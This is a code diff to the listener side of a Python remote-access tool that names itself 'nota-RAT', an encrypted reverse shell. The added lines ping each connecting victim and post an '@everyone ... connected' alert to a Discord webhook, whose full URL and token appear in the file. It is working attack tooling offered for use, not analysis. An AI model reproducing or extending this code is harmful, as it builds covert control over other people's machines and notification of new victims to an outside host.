@@ -1,7 +1,11 @@
 import socket
 import argparse
 import os
+import datetime
+from pythonping import ping
 from cryptography.fernet import Fernet
+from discord_webhook import DiscordWebhook, DiscordEmbed
+
 
 parser = argparse.ArgumentParser(
     description="nota-RAT, python reverse shell using sockets."
@@ -40,6 +44,18 @@ print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
 
 client_socket, client_address = s.accept()
 print(f"{client_address[0]}:{client_address[1]} Connected!")
+#webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1036935355934453790/32ktylVPdphVHLh3WH-73VQrZqKtkPf-pf-7sDv-YnBWRF2D9CpMoHkIiItES-jm4J91", content=f'@everyone \n {client_address[0]} connected')
+#webhook.execute()
+response_list = ping(f'{client_address[0]}', size=40, count=10)
+webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1036935355934453790/32ktylVPdphVHLh3WH-73VQrZqKtkPf-pf-7sDv-YnBWRF2D9CpMoHkIiItES-jm4J91')
+embed = DiscordEmbed(title='nota-RAT', description='an encrypted reverse shell', color='03b2f8')
+embed.set_author(name='fluffydolphin', url='https://github.com/fluffydolphin')
+embed.add_embed_field(name='Connection', value=f'@everyone \n {client_address[0]} connected')
+embed.add_embed_field(name='Ping', value=f'{response_list.rtt_avg_ms}')
+embed.set_timestamp()
+webhook.add_embed(embed)
+webhook.execute()
+
 
 cwd = client_socket.recv(BUFFER_SIZE)
 cwd = Fernet(key).decrypt(cwd).decode()
